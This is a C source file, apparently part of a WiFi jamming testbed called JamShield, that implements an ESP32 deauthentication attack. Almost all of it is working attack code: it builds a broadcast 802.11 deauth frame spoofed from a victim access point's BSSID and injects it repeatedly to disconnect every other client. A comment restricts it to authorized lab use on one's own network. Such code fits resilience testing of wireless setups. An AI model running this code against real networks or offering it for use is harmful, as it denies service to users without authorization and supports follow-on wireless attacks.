/*
 * JamShield jammer — Espressif HAL shim for raw 802.11 injection.
 *
 * Sends broadcast DEAUTH frames spoofed from the victim AP's BSSID. The jammer
 * is associated to the AP as a normal client (so the WiFi driver is in its
 * stable state and already tuned to the AP's channel); injected frames are not
 * received by the sender, so the jammer does not deauth itself — only the other
 * clients (the JamShield node) get kicked off.
 *
 * Isolated here because esp_wifi.h clashes with zephyr/net/wifi_mgmt.h.
 * Authorized educational/lab use on your OWN network only.
 */
#include <stdint.h>
#include <esp_wifi.h>

/* 802.11 deauthentication frame (26 bytes). SA/BSSID filled from the AP we
 * associate to (jam_hal_set_bssid). */
static uint8_t deauth[26] = {
	0xc0, 0x00,                         /* FC: deauth                     */
	0x00, 0x00,                         /* duration                       */
	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, /* DA: broadcast (all clients)    */
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* SA  = AP BSSID                 */
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* BSSID = AP                     */
	0x00, 0x00,                         /* seq                            */
	0x07, 0x00,                         /* reason 7: class-3 frame        */
};

void jam_hal_set_bssid(const uint8_t *bssid)
{
	for (int i = 0; i < 6; i++) {
		deauth[10 + i] = bssid[i];
		deauth[16 + i] = bssid[i];
	}
}

/* Send `count` deauth frames on the current (associated) channel.
 * Returns the last esp_wifi_80211_tx result (0 = accepted). */
int jam_hal_burst(int count)
{
	int last = 0;

	for (int i = 0; i < count; i++) {
		last = (int)esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth),
					      false);
	}
	return last;
}
